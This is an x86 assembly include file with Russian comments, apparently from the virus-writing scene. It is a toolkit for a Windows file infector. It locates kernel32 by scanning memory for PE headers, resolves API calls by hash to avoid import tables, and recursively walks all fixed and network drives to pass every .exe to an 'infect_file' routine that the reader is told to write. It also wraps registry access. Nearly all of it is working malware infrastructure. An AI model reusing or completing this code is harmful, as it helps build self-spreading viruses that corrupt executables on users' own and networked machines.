; Если некоторые функции не нужны, то установите значение в 0 и они не
; будут компиляться

f_fopen3			=	0 ; Открыть файл
f_fclose3			=	0 ; Закрыть файл
f_fread3			=	0 ; Считать из файла
f_fwrite3			=	0 ; Записать в файл
f_fseek3			=	0 ; Переместить указатель в файле
f_malloc3			=	0 ; Выделить память
f_mfree3			=	0 ; Освободить память

f_findfirst3		=	0 ; Найти 1ый файл
f_findnext3			=	0 ; Найти следующий файл
f_findclose3		=	0 ; Прекратить поиск
f_process_drives	=	0 ; Обработать все диски
f_process_directory	=	0 ; Обработать директорию
f_process_file		=	0 ; Обработать файл (вызывает infect_file)

f_RegOpenKeyExA     =	0 ; Открыть ключ
f_RegQueryValueExA  =	0 ; Получить значение
f_RegSetValueExA    =	0 ; Установить значение
f_RegCloseKey       =	0 ; Закрыть ключ

access_edi	equ	(dword ptr 0*4)
access_esi	equ	(dword ptr 1*4)
access_ebp	equ	(dword ptr 2*4)
access_esp	equ	(dword ptr 3*4)
access_ebx	equ	(dword ptr 4*4)
access_edx	equ	(dword ptr 5*4)
access_ecx	equ	(dword ptr 6*4)
access_eax	equ	(dword ptr 7*4)

;-------------------------------------------------------------
IF f_fopen3
fopen3:
;in:
;   EDI -> file name
;out:
;   EAX =  handle
;	ZF  = 1 if error
	pusha
	sub		EAX, EAX
	push	EAX
	push	EAX
	push	4
	push	EAX
	push	3
	push	40000000h or 80000000h
	push	EDI
	callK32 CreateFileA
exit_fopen3:
	mov		[ESP].access_eax, EAX
	or		EAX, EAX
	jz		exit_fopen3_error	
	cmp		EAX, -1
	popa
	ret
exit_fopen3_error:
	add		ESP, 28
	or		EAX, EAX
	popa
	ret
ENDIF

;-------------------------------------------------------------
IF f_fclose3
fclose3:
;in:
;   EBX = handle
	pusha
	push	EBX
	callK32	CloseHandle
exit_fclose3:
	or		EAX, EAX
	popa
	ret
ENDIF

;-------------------------------------------------------------
IF f_fread3
fread3:
;in:
;   EBX =  handle
;   EDI -> buffer
;   ECX =  bytes to read

	pusha
	sub		EAX, EAX
	push	EDX
	mov		EDX, ESP
	
	push	EAX
	push	EDX
	push	ECX
	push	EDI
	push	EBX
	callK32	ReadFile
exit_fread3:
	mov		[ESP].access_eax, EAX
	or		EAX, EAX
	pop		EDX
	popa
	ret
ENDIF

;-------------------------------------------------------------
IF f_fwrite3
fwrite3:
;in:
;   EBX =  handle
;   EDI -> buffer
;   ECX =  bytes to write

	pusha
	sub		EAX, EAX
	push	EDX
	mov		EDX, ESP

	push	EAX
	push	EDX
	push	ECX
	push	EDI
	push	EBX
	callK32 WriteFile
exit_write3:
	mov		[ESP].access_eax, EAX
	or		EAX, EAX
	pop		EDX
	popa
	ret
ENDIF

;-------------------------------------------------------------
FILE_BEGIN		=	0
FILE_CURRENT	=	1
FILE_END		=	2

IF f_fseek3
fseek3:
;in:
;   EBX = handle
;   ECX = на скока сикаться
;   ESI = откуда ничинать сикаться (FILE_BEGIN, FILE_CURRENT или FILE_END) 
;out:
;	EAX =  позиция в файле
	pusha
	sub		EAX, EAX
	push	ESI
	push	EAX
	push	ECX
	push	EBX
	callK32	SetFilePointer
exit_fseek3:
	mov		[ESP].access_eax, EAX
	popa
	ret
ENDIF

;-------------------------------------------------------------
IF f_malloc3
malloc3:
;in:
;   ECX = скока
;out:
;   EAX -> на памать

	pusha
	sub		EAX, EAX
	or		AL, 40h
	push	ECX
	push	EAX
	callK32 GlobalAlloc
exit_malloc3:
	mov		[ESP].access_eax, EAX
	or		EAX, EAX
	jz		exit_malloc3_error
	popa
	ret
exit_malloc3_error:
	add		ESP, 8
	or		EAX, EAX
	popa
	ret
ENDIF

;-------------------------------------------------------------
IF f_mfree3
mfree3:
;in:
;	EAX = указатель на выделенныю память

	pusha
	push	EAX
	callK32	GlobalFree
exit_mfree3:
	or		EAX, EAX
	popa
	ret
ENDIF

;-------------------------------------------------------------
IF f_findfirst3
findfirst3:
;in:
;   EDI -> Find Struct
;   EDX -> маска поиска
;out:
;   EAX = хендл поиска || EAX = 0 если ошибка

	pusha
	push	EDI
	push	EDX
	callK32	FindFirstFileA 
exit_findfirst3:
	mov		[ESP].access_eax, EAX
	or		EAX, EAX
	jz		exit_findfirst3_error
	popa
	ret
exit_findfirst3_error:
	add		ESP, 8
	or		EAX, EAX
	popa
	ret
ENDIF

;-------------------------------------------------------------
IF f_findnext3
findnext3:
;in:
;   EDI -> Find Struct
;   EBX =  хендл поиска

	pusha
	push	EDI
	push	EBX
	callK32	FindNextFileA
exit_findnex3:
	or		EAX, EAX
	popa
	ret
ENDIF

;-------------------------------------------------------------
IF f_findclose3
findclose3:
;in:
;   EBX =  хендл поиска

	pusha
	push	EBX
	callK32 FindClose
exit_findclose3:
	or		EAX, EAX
	popa
	ret
ENDIF

;-------------------------------------------------------------
find_base:
; IN: EAX = some addr inside img
; OUT: EAX = img base, EBX = PE hdr

    xor		AX, AX          ; align by 64K
is_base:
    cmp 	2 ptr [EAX], 'ZM'    
    jne 	next_addr
check_pe:
    mov 	EBX, [EAX.mz_peptr]
    add 	EBX, EAX
    cmp 	4 ptr [EBX], 'EP'
    je  	base_found          ; we find it!
next_addr:
    sub 	EAX, 1000h
    jmp 	is_base
base_found:
    ret

;-------------------------------------------------------------
find_kern:
; IN: 		EBX = img base
; OUT: 		EAX = kern base or zero if not found
;			EBX = kern PE hdr
	
    mov 	EAX, [EBX.mz_peptr]    ; EAX = PE hdr RVA
    mov 	EAX, [EAX + EBX + 080h] ; EAX = import table VA
    or  	EAX, EAX        ; have imports?
    jz  	no_kern
check_entry:
    mov 	ECX, [EAX + EBX + 0Ch]  ; ECX = 1st dll name RVA
    or  	ECX, ECX        ; is null(last) entry?
    jz  	no_kern
    add 	ECX, EBX        ; ECX = 1st dll name VA
    cmp 	4 ptr [ECX], 'NREK'
    jne 	next_entry
    cmp 	4 ptr [ECX + 4], '23LE'
    je  	kern_found
next_entry:
    add 	EAX, 14h
    jmp check_entry
kern_found: 
    mov	 	EAX, [EAX + EBX + 10h]  ; EAX = import address table RVA
    mov 	EAX, [EBX + EAX]    ; EAX = some kern func addr
    call    find_base
    ret
no_kern:
    xor		EAX, EAX
    ret

;-------------------------------------------------------------
find_proc:
; IN:
;           EAX -> img base и
;           EBX -> PE hdr того, где надо искать
;           ESI -> хэш искомой функции
; OUT: 
;           EAX = адрес искомой функции, или 0
;			FZ = 1 при ошибке

    mov     EBX, [EBX.pe_exporttablerva]    ; EBX = exp tbl RVA
    add     EBX, EAX                        ; EBX = ... VA

    sub     EDX, EDX
    mov     EDI, [EBX + 20h]                ; EDI = name tbl RVA
    add     EDI, EAX                        ; ... VA

find_function:  

    push    ESI
    push    EDI
    push    ECX
    push    EAX

    mov     ECX, ESI
    mov     ESI, [EDI]                      ; EDI = cur name RVA
    add     ESI, EAX                        ; EDI = ... VA

    call    hash
    cmp     ESI, ECX
    je      function_found                  

    pop     EAX
    pop     ECX
    pop     EDI
    pop     ESI

    inc     EDX                             ; next func
    add     EDI, 4                          ; next name
    jmp     find_function

exit_err_find_proc:
    sub     EAX, EAX
    ret

function_found:
    ; and now what we are all waiting for...
    pop     EAX
    pop     ECX
    pop     EDI
    pop     ESI

    mov     ECX, [EBX + 24h]                ; ord tbl RVA
    add     ECX, EAX                        ; ... VA

    inc     EDX
    movzx   EDI, 2 ptr [ECX + EDX * 2]
    sub     EDI, [EBX + 10h]
    
    mov     ECX, [EBX + 1Ch]
    add     ECX, EAX
    
    mov     EDI, [ECX + EDI * 4]
    add     EDI, EAX
    xchg    EDI, EAX

exit_succ:    
	or		EAX, EAX
    ret


;-------------------------------------------------------------
hash:
; IN: ESI -> строка
;           
; OUT:  ESI = хэш

    push    EAX
    xor     EAX, EAX
hash_cicl:
    rol     EAX, 7
    xor     AL, [ESI]
    inc     ESI
    cmp     byte ptr [ESI], 0
    jne     hash_cicl
    xchg    EAX, ESI    
    pop     EAX
    ret

;-------------------------------------------------------------
find_kernel_proc:
;in:	ESI = hash
	pushad
    call	get_addr
get_addr:
    pop		EAX
    call	find_base
    xchg	EBX, EAX
    call	find_kern
    or		EAX, EAX
    jz		exit_find_kernel_proc
    call	find_proc
exit_find_kernel_proc:
	or		EAX, EAX
	mov		[ESP].access_eax, EAX
	popad
    ret


;----------------------------------------------------------------------------
;Функции поиска файлов (by Z0MBiE http://zombie.cjb.net)

RECSERCH_MAXFILENAME    equ     1024
DRIVE_FIXED             equ     3
DRIVE_REMOTE            equ     4

IF f_process_drives
process_drives:         pusha
                        mov     eax, -'\:A'
                        neg     eax
                        push    eax
_cycle:                 push    esp
                        callK32 GetDriveTypeA
                        cmp     eax, DRIVE_FIXED
                        je      __do
                        cmp     eax, DRIVE_REMOTE
                        jne     _next
__do:                   mov     edx, esp
                        call    process_directory
_next:                  inc     byte ptr [esp]
                        cmp     byte ptr [esp], 'Z'
                        jbe     _cycle
                        pop     eax
                        popa
                        retn
ENDIF

;функция:    process_directory
;action:     1. найти все файлы в директории
;            2. для каждой найденной поддиректории кроме '.'/'..' рекурсивно;
;               для каждого найденного имени вызвать process_file
;input:      EDI=ff_struc
;            EDX=имя директории (полный путь)
;output:     нет

IF f_process_directory
process_directory:      pusha
                        sub     esp, RECSERCH_MAXFILENAME

                        mov     esi, edx
                        mov     ebx, edi
                        mov     edi, esp
__1:                    lodsb
                        stosb
                        or      al, al
                        jnz     __1
                        dec     edi
                        mov     al, '\'
                        cmp     [edi-1], al
                        je      __3
                        stosb
__3:                    mov     ecx, edi
                        mov     eax, -'*.*'
                        neg     eax
                        stosd
                        mov     edi, ebx

                        mov     edx, esp
                        call    findfirst3
                        ;cmp     eax, -1
                        jz      __quit
                        xchg    ebx, eax

__cycle:                pusha
                        lea     esi, [edi].ff_fullname
                        mov     edi, ecx
__2:                    lodsb
                        stosb
                        or      al, al
                        jnz     __2
                        popa

                        mov     edx, esp

                        test    byte ptr [edi].ff_attr, 16
                        jnz     __dir

                        call    process_file

                        jmp     __next

__dir:                  cmp     byte ptr [edi].ff_fullname, '.'
                        je      __next

                        call    process_directory

__next:                 call    findnext3
                        jnz     __cycle

                        call    findclose3

__quit:                 add     esp, RECSERCH_MAXFILENAME
                        popa
                        retn
ENDIF

;функция:    process_file
;action:     вызвать infect_file, которая ВЫ должны сами ниписать!!! :)
;input:      EDI->ff_struc
;            EDX->имя файла
;output:     нет

IF f_process_file
process_file:           pusha

                        mov     ecx, edx
__scan0:                mov     eax, [ecx]
                        inc     ecx
                        or      al, al
                        jnz     __scan0
                        mov     eax, [ecx-5]
                        or      eax, 20202000h
                        neg     eax

                        cmp     eax, -'exe.'
                        je      __do_infect

                        jmp     __exit

__do_infect:            neg     ecx

                        ; EDX->имя файла, EDI->ff_struc, ECX=расширение
                        call    infect_file

__exit:                 popa
                        retn
ENDIF


;----------------------------------------------------------------------------
; Далее идёт работа с реестром (спасибо Alex // VDxGrouP)

;Тип доступа
KEY_READ				= 131097
KEY_WRITE 				= 131078
KEY_ALL_ACCESS 			= 983103

;Возможные ветки
HKEY_CLASSES_ROOT     	= 80000000h
HKEY_CURRENT_USER     	= 80000001h
HKEY_LOCAL_MACHINE    	= 80000002h
HKEY_USERS            	= 80000003h
HKEY_PERFORMANCE_DATA 	= 80000004h
HKEY_CURRENT_CONFIG   	= 80000005h
HKEY_DYN_DATA         	= 80000006h

;Типы данных и т.п.
REG_NONE                = 0
REG_SZ                  = 1
REG_EXPAND_SZ           = 2
REG_BINARY              = 3
REG_DWORD               = 4
REG_DWORD_ENDIAN		= 4
REG_DWORD_BIG_ENDIAN    = 5
REG_LINK                = 6
REG_MULTI_SZ            = 7
REG_RESOURCE_LIST       = 8
REG_FULL_RES_DESCRIPTOR = 9
REG_RESOURCE_REQ_LIST	= 10

;-------------------------------------------------------------
IF f_RegOpenKeyExA
RegOpenKeyExA:
;На входе:
;	EAX = offset hk, хендлер
;	EBX = тип доступа к ключу
;	ECX = offset path, путь 
;	EDX = какая ветка (HKEY_CURRENT_USER, и т.д.)
;На выходе:
;	ZF = 1, если нет ошибки

	pusha 
	push	EAX
	push	EBX
	push	0
	push	ECX
	push	EDX
	callREG	RegOpenKeyExA
	test	EAX, EAX
	popa
	ret
ENDIF

;-------------------------------------------------------------
IF f_RegQueryValueExA
RegQueryValueExA:
;На входе:
;	EAX = offset на имя переменной
;	EBX = хендл ключа
;	ECX = offset на дворд, в котором длина результирующего буфера
;	EDX = offset на буфер, в который поступет результат
;На выходе:
;	ZF = 1, если нет ошибки

	pusha 
	push	ECX
	push	EDX
	push	0
	push	0
	push	EAX
	push	EBX
	callREG	RegQueryValueExA
	test	EAX, EAX
	popa
	ret
ENDIF

;-------------------------------------------------------------
IF f_RegSetValueExA
RegSetValueExA:
;На входе:
;	EAX = offset на имя новой переменной
;	EBX = хендл ключа
;	ECX = размер новой переменной в байтах
;	EDX = offset на значение новой переменной
;	EDI = тип создаваемой переменной
;На выходе:
;	ZF = 1, если нет ошибки

	pusha 
	push	ECX
	push	EDX
	push	EDI
	push	0
	push	EAX
	push	EBX
	callREG	RegSetValueExA
	test	EAX, EAX
	popa
	ret
ENDIF

;-------------------------------------------------------------
IF f_RegCloseKey
RegCloseKey:
;На входе:
;	EBX = хендл ключа
;На выходе:
;	ZF = 1, если нет ошибки

	pusha 
	push	EBX
	callREG	RegCloseKey
	test	EAX, EAX
	popa
	ret
ENDIF